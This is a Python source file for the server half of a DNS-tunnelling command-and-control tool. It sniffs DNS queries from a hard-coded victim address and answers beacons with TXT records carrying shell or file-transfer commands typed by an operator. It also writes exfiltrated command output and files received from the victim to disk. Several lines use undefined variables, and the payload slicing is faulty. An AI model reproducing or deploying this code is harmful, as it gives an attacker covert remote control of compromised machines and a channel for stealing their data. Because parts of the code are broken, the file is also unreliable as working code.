
from dns_c2_modules import *


commands_que = {}
opened_fd = ""


def commands_input():
    global commands_que
    while True:
        if not commands_que:
            words = input("\nEnter type and command (ex: run ls):\n").split ()
            key = words[0]                      #extract the first word as key
            value = ' '.join(words[1:])         # extract all the rest as value
            commands_que = {key: value}   
            print(commands_que)
            
def build_p(packet,data):
    PKT = IP(dst=packet[IP].src)/UDP(dport=packet[UDP].sport)/DNS(qd=packet[DNS].qd,rd=0,qr=1,an=DNSRR(rrname=packet[DNS].qd.qname,type='TXT',rdata=data))
    return PKT

def send_command(ip_adr,vic_sport,get_qname,packet):
    global commands_que
    if not commands_que:
        return
    print("commands_que:")
    prefix = next(iter(commands_que))           
    print("prefix is: " + prefix)
    command_name = commands_que[prefix]
    print("command is: " + command_name)
    if prefix == RUN_MODEL:
        prefix = RUN
    elif prefix == SEND_MODEL:
        prefix = FILE
    bin_command = bytes(command_name.encode())
	 
    combined = prefix + bin_command

    built_pkt = build_p(packet,combined)
    send(built_pkt)

    commands_que = ""
        
    
def parse_packet(packet):
    global opened_fd
    
    if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0: 
        print("i am in parse")
        victim_ip = packet[IP].src
        if (victim_ip) != "192.168.1.21":
            return
        vic_sport = packet[UDP].sport
        get_qname = packet[DNS].qd.qname
        print("print qname:")
        print(get_qname)   # class bytes
        if get_qname.startswith(BEACON):
            data_recieved = get_qname[len(BEACON)]
            send_command(victim_ip,vic_sport,get_qname,packet)
         
        elif get_qname.startswith(BEGIN_OUTPUT):
            data_recieved = get_qname[len(BEGIN_OUTPUT)]	 
            opened_fd = open_file(LOG_OUTPUT)
            write_to_file(opened_fd,data_recieved)  
            
        elif get_an.startswith(BEGIN_FILE):
            data_recieved = get_qname[len(BEGIN_FILE)]            
            file_name = os.path.basename(data_recieved)
            opened_fd = open_file(file_name)
            
        elif prefix_packet == IN_TRANSFER:
            write_to_file(opened_fd,data_recieved)  # write the content to the opened fd
            
        elif get_an.startswith(EF):       
            close_file(opened_fd)
            opened_fd = ""
            print("transer complete")
            

def open_file(file_name):
	flags = os.O_WRONLY|os.O_CREAT|os.O_APPEND
	fd = os.open(file_name,flags)
	return fd

                     
def server_listen():
    sniff_pkt(pfilter="udp and port 53",handler=parse_packet)
    
if __name__=="__main__":
    signal.signal(signal.SIGINT, signal_handler)

    enter_command_thread = threading.Thread(target=commands_input)
    enter_command_thread.start()

    print("start listening")
    server_listen()    # Start sniffing packets





